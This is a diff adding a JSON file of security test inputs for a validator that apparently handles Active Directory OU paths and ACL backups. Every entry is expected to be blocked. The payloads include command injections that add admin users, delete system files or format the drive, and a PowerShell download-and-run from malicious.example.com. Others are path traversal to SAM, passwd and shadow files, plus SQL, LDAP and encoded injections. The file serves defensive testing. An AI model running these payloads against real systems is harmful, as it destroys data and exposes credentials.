@@ -1,0 +1,271 @@
+{
+  "metadata": {
+    "description": "MALICIOUS INPUT TEST DATA - FOR SECURITY TESTING ONLY",
+    "warning": "ALL INPUTS IN THIS FILE ARE MALICIOUS AND MUST BE MOCKED - NEVER EXECUTE WITHOUT PROPER SECURITY MOCKS",
+    "purpose": "Test security validation and input sanitization",
+    "lastUpdated": "2024-01-15",
+    "riskLevel": "CRITICAL - CONTAINS ACTUAL MALICIOUS PATTERNS"
+  },
+  "commandInjection": [
+    {
+      "id": "CI-001",
+      "input": "OU=Users,DC=contoso,DC=com'; net user hacker Password123! /add #",
+      "description": "SQL injection style with Windows user creation command",
+      "riskLevel": "CRITICAL",
+      "expectedBlocked": true,
+      "category": "UserCreation",
+      "notes": "Attempts to create privileged user account"
+    },
+    {
+      "id": "CI-002", 
+      "input": "OU=Test & del /Q /S C:\\Windows\\System32\\*.dll",
+      "description": "Command chaining with system file deletion",
+      "riskLevel": "CRITICAL",
+      "expectedBlocked": true,
+      "category": "SystemDestruction",
+      "notes": "Would delete critical system files"
+    },
+    {
+      "id": "CI-003",
+      "input": "OU=Groups,DC=test,DC=com | powershell.exe -Command \"Remove-Item 'C:\\*' -Recurse -Force\"",
+      "description": "Pipe to PowerShell with destructive command",
+      "riskLevel": "CRITICAL", 
+      "expectedBlocked": true,
+      "category": "DataDestruction",
+      "notes": "Complete system wipe attempt"
+    },
+    {
+      "id": "CI-004",
+      "input": "OU=Test && net localgroup Administrators hacker /add",
+      "description": "Command chaining to add user to administrators",
+      "riskLevel": "HIGH",
+      "expectedBlocked": true,
+      "category": "PrivilegeEscalation",
+      "notes": "Privilege escalation attempt"
+    },
+    {
+      "id": "CI-005",
+      "input": "OU=Test || cmd.exe /c \"echo Malicious payload executed\"",
+      "description": "OR command execution with CMD",
+      "riskLevel": "HIGH",
+      "expectedBlocked": true,
+      "category": "CommandExecution",
+      "notes": "Demonstrates command injection vector"
+    }
+  ],
+  "scriptInjection": [
+    {
+      "id": "SI-001",
+      "input": "OU=Test`$(Invoke-Expression 'Remove-Item C:\\Windows\\System32\\*')",
+      "description": "PowerShell subexpression with file deletion",
+      "riskLevel": "CRITICAL",
+      "expectedBlocked": true,
+      "category": "PowerShellInjection",
+      "notes": "Uses PowerShell subexpression syntax for code execution"
+    },
+    {
+      "id": "SI-002",
+      "input": "OU=Test'; iex (New-Object Net.WebClient).DownloadString('http://malicious.example.com/payload.ps1') #",
+      "description": "Remote script download and execution",
+      "riskLevel": "CRITICAL",
+      "expectedBlocked": true,
+      "category": "RemoteCodeExecution", 
+      "notes": "Downloads and executes remote malicious script"
+    },
+    {
+      "id": "SI-003",
+      "input": "OU=Test`Add-Type -TypeDefinition 'using System; public class Evil { public static void Main() { System.IO.Directory.Delete(@\"C:\\Windows\", true); } }'",
+      "description": "Dynamic code compilation with destructive payload",
+      "riskLevel": "CRITICAL",
+      "expectedBlocked": true,
+      "category": "CodeCompilation",
+      "notes": "Compiles and executes malicious .NET code"
+    },
+    {
+      "id": "SI-004",
+      "input": "OU=Test\"; [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('Pwned')",
+      "description": "Reflection-based code execution",
+      "riskLevel": "HIGH",
+      "expectedBlocked": true,
+      "category": "ReflectionAttack",
+      "notes": "Uses reflection to execute unauthorized code"
+    },
+    {
+      "id": "SI-005",
+      "input": "OU=Test`Start-Process cmd.exe -ArgumentList '/c format C: /y'",
+      "description": "Process execution for disk formatting",
+      "riskLevel": "CRITICAL",
+      "expectedBlocked": true,
+      "category": "SystemDestruction",
+      "notes": "Attempts to format system drive"
+    }
+  ],
+  "pathTraversal": [
+    {
+      "id": "PT-001",
+      "input": "..\\..\\..\\Windows\\System32\\config\\SAM",
+      "description": "Windows SAM file access via path traversal",
+      "riskLevel": "HIGH",
+      "expectedBlocked": true,
+      "category": "SystemFileAccess",
+      "notes": "Attempts to access Windows Security Account Manager database"
+    },
+    {
+      "id": "PT-002",
+      "input": "../../../../etc/passwd",
+      "description": "Linux password file access",
+      "riskLevel": "HIGH", 
+      "expectedBlocked": true,
+      "category": "CredentialAccess",
+      "notes": "Standard Unix/Linux password file access attempt"
+    },
+    {
+      "id": "PT-003",
+      "input": "C:\\Backup\\..\\..\\..\\Windows\\System32\\cmd.exe",
+      "description": "Mixed absolute and relative path to system executable",
+      "riskLevel": "HIGH",
+      "expectedBlocked": true,
+      "category": "ExecutableAccess",
+      "notes": "Attempts to execute system command interpreter"
+    },
+    {
+      "id": "PT-004",
+      "input": "%SYSTEMROOT%\\..\\..\\..\\Windows\\System32\\net.exe",
+      "description": "Environment variable with path traversal",
+      "riskLevel": "MEDIUM",
+      "expectedBlocked": true,
+      "category": "EnvironmentExploit",
+      "notes": "Uses environment variables to obscure path traversal"
+    },
+    {
+      "id": "PT-005",
+      "input": "~/../../../etc/shadow",
+      "description": "Unix home directory traversal to shadow file",
+      "riskLevel": "HIGH",
+      "expectedBlocked": true,
+      "category": "CredentialAccess", 
+      "notes": "Attempts to access Unix shadow password file"
+    }
+  ],
+  "sqlInjection": [
+    {
+      "id": "SQLi-001",
+      "input": "'; DROP TABLE ACLBackups; --",
+      "description": "SQL injection to drop backup table",
+      "riskLevel": "CRITICAL",
+      "expectedBlocked": true,
+      "category": "DataDestruction",
+      "notes": "Would destroy backup data if executed against database"
+    },
+    {
+      "id": "SQLi-002",
+      "input": "1' OR '1'='1' --",
+      "description": "Authentication bypass SQL injection",
+      "riskLevel": "HIGH",
+      "expectedBlocked": true,
+      "category": "AuthenticationBypass",
+      "notes": "Classic SQL injection for authentication bypass"
+    },
+    {
+      "id": "SQLi-003",
+      "input": "'; INSERT INTO Users (username, password, isAdmin) VALUES ('hacker', 'password', 1); --",
+      "description": "Data insertion SQL injection",
+      "riskLevel": "HIGH",
+      "expectedBlocked": true,
+      "category": "DataManipulation",
+      "notes": "Inserts malicious user with admin privileges"
+    },
+    {
+      "id": "SQLi-004",
+      "input": "' UNION SELECT username, password FROM Users WHERE isAdmin=1 --",
+      "description": "Data extraction via UNION SELECT",
+      "riskLevel": "HIGH",
+      "expectedBlocked": true,
+      "category": "DataExtraction",
+      "notes": "Extracts sensitive user credentials"
+    },
+    {
+      "id": "SQLi-005",
+      "input": "'; UPDATE Users SET isAdmin=1 WHERE username='attacker'; --",
+      "description": "Privilege escalation via SQL injection",
+      "riskLevel": "HIGH",
+      "expectedBlocked": true,
+      "category": "PrivilegeEscalation",
+      "notes": "Elevates attacker account to admin privileges"
+    }
+  ],
+  "encodingAttacks": [
+    {
+      "id": "EA-001",
+      "input": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "description": "URL encoded path traversal",
+      "riskLevel": "HIGH",
+      "expectedBlocked": true,
+      "category": "EncodedTraversal",
+      "notes": "URL encoding used to bypass basic filters"
+    },
+    {
+      "id": "EA-002",
+      "input": "OU=Test%00.exe",
+      "description": "Null byte injection", 
+      "riskLevel": "MEDIUM",
+      "expectedBlocked": true,
+      "category": "NullByteAttack",
+      "notes": "Null byte to truncate filename validation"
+    },
+    {
+      "id": "EA-003",
+      "input": "OU=Test&#x27;&#x20;OR&#x20;&#x27;1&#x27;=&#x27;1",
+      "description": "HTML entity encoded SQL injection",
+      "riskLevel": "HIGH",
+      "expectedBlocked": true,
+      "category": "EntityEncoding",
+      "notes": "HTML entities to bypass input filters"
+    }
+  ],
+  "ldapInjection": [
+    {
+      "id": "LI-001",
+      "input": "*)(&(objectClass=user)(userPassword=*))",
+      "description": "LDAP injection to bypass authentication",
+      "riskLevel": "HIGH",
+      "expectedBlocked": true,
+      "category": "LDAPBypass",
+      "notes": "Modifies LDAP query to return all users"
+    },
+    {
+      "id": "LI-002",
+      "input": "*)(|(objectClass=*)",
+      "description": "LDAP injection to retrieve all objects",
+      "riskLevel": "MEDIUM",
+      "expectedBlocked": true,
+      "category": "DataExtraction",
+      "notes": "Extracts all LDAP objects regardless of intended filter"
+    }
+  ],
+  "testInstructions": {
+    "criticalWarning": "NEVER EXECUTE THESE INPUTS WITHOUT PROPER MOCKING",
+    "securityRequirements": [
+      "All dangerous operations must be mocked",
+      "Security validation functions must be tested with controlled responses", 
+      "Test environment must be isolated",
+      "All malicious patterns must be blocked",
+      "Security violations must be logged with correlation IDs"
+    ],
+    "mockingRequirements": [
+      "Mock Invoke-Expression to prevent code execution",
+      "Mock Remove-Item for system file protection", 
+      "Mock Start-Process to prevent command execution",
+      "Mock all network operations",
+      "Mock all database operations",
+      "Mock all file system operations affecting system directories"
+    ],
+    "testVerification": [
+      "Verify security mocks are active before testing",
+      "Confirm malicious inputs are properly blocked",
+      "Validate security event logging",
+      "Test correlation ID tracking",
+      "Verify error messages don't leak sensitive information"
+    ]
+  }
+}
